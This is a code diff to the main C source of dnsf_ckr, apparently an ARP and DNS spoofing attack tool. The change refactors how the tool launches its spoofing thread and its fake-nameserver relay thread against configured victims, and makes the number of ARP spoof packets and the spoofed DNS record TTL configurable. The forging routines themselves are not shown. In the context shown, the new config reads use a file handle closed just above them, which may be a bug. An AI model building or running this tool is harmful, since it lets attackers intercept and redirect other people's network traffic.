@@ -27,13 +27,27 @@ pthread_attr_t spf_thread_attr, rly_thread_attr;
 
 pthread_t spf_thread, rly_thread;
 
-void sigint_watchdog(int sig) {
+static void sigint_watchdog(int sig);
+
+static void sigsegv_watchdog(int signo);
+
+static FILE *get_attack_map_fp(const char *option);
+
+static void start_nbots(dnsf_ckr_victims_ctx *victims,
+                        dnsf_ckr_servers_ctx *servers,
+                        dnsf_ckr_hostnames_set_ctx *hostnames,
+                        dnsf_ckr_realdnstransactions_ctx *transactions,
+                        dnsf_ckr_fakenameserver_ctx *fakenameserver,
+                        char *iface, int arpspf_pkt_nr,
+                        int dnsspf_ttl);
+
+static void sigint_watchdog(int sig) {
     dnsf_ckr_request_abort();
     printf("\n________________________________________\n"
            "dnsf_ckr INFO: exiting... please wait...\n");
 }
 
-void sigsegv_watchdog(int signo) {
+static void sigsegv_watchdog(int signo) {
     size_t size;
     void *array[50];
     printf("*** SIGSEGV PANIC ***\n\n");
@@ -43,29 +57,29 @@ void sigsegv_watchdog(int signo) {
     exit(1);
 }
 
-FILE *get_attack_map_fp(const char *option) {
+static FILE *get_attack_map_fp(const char *option) {
     FILE *fp = fopen(option, "rb");
     return fp;
 }
 
-void start_nbots(dnsf_ckr_victims_ctx *victims,
-                 dnsf_ckr_servers_ctx *servers,
-                 dnsf_ckr_hostnames_set_ctx *hostnames,
-                 dnsf_ckr_realdnstransactions_ctx *transactions,
-                 dnsf_ckr_fakenameserver_ctx *fakenameserver,
-                 char *iface) {
+static void start_nbots(dnsf_ckr_victims_ctx *victims,
+                        dnsf_ckr_servers_ctx *servers,
+                        dnsf_ckr_hostnames_set_ctx *hostnames,
+                        dnsf_ckr_realdnstransactions_ctx *transactions,
+                        dnsf_ckr_fakenameserver_ctx *fakenameserver,
+                        char *iface, int arpspf_pkt_nr,
+                        int dnsspf_ttl) {
     struct dnsf_ckr_bot_routine_ctx spf_args, rly_args;
-    int sent_nr = 3, timeout = 1;
 
     //  the spoofing thread routine arguments...
     spf_args.arg[0] = transactions;
     spf_args.arg[1] = iface;
-    spf_args.arg[2] = &timeout;
-    spf_args.arg[3] = &sent_nr;
+    spf_args.arg[2] = &arpspf_pkt_nr;
 
     //  the relay thread routine arguments...
     rly_args.arg[0] = transactions;
     rly_args.arg[1] = fakenameserver;
+    rly_args.arg[2] = &dnsspf_ttl;
 
     pthread_attr_init(&spf_thread_attr);
     pthread_create(&spf_thread, &spf_thread_attr, dnsf_ckr_arp_spoofing_bot_routine, &spf_args);
@@ -87,6 +101,8 @@ int main(int argc, char **argv) {
     dnsf_ckr_fakenameserver_ctx *fakenameserver = NULL;
     char iface[0xff];
     int exit_code = 0;
+    int arpspf_pkt_nr = 0;
+    int dnsspf_ttl = 0;
 
     if (argc > 1) {
         memset(iface, 0, sizeof(iface));
@@ -169,6 +185,10 @@ int main(int argc, char **argv) {
         fclose(fp);
     }
 
+    arpspf_pkt_nr = dnsf_ckr_get_core_int_config(fp, "arpspf-pkt-nr", 3);
+
+    dnsspf_ttl = dnsf_ckr_get_core_int_config(fp, "dnsspf-ttl", 240);
+
     signal(SIGINT, sigint_watchdog);
     signal(SIGTERM, sigint_watchdog);
     signal(SIGHUP, sigint_watchdog);
@@ -182,7 +202,7 @@ int main(int argc, char **argv) {
         fclose(fp);
         fp = NULL;
         dnsf_ckr_init_sockio(iface);
-        start_nbots(victims, servers, hostnames, transactions, fakenameserver, iface);
+        start_nbots(victims, servers, hostnames, transactions, fakenameserver, iface, arpspf_pkt_nr, dnsspf_ttl);
         dnsf_ckr_fini_sockio();
     }
     del_dnsf_ckr_victims_ctx(victims);
